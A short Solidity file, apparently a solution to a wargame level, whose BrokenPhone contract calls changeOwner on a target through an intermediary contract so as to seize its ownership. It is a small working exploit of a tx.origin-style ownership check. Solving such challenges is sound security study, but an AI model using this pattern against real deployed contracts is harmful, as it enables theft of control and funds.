// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract BrokenPhone {

    function crack(address phone, address new_owner) external {
        ITelephone(phone).changeOwner(new_owner);
    }
}
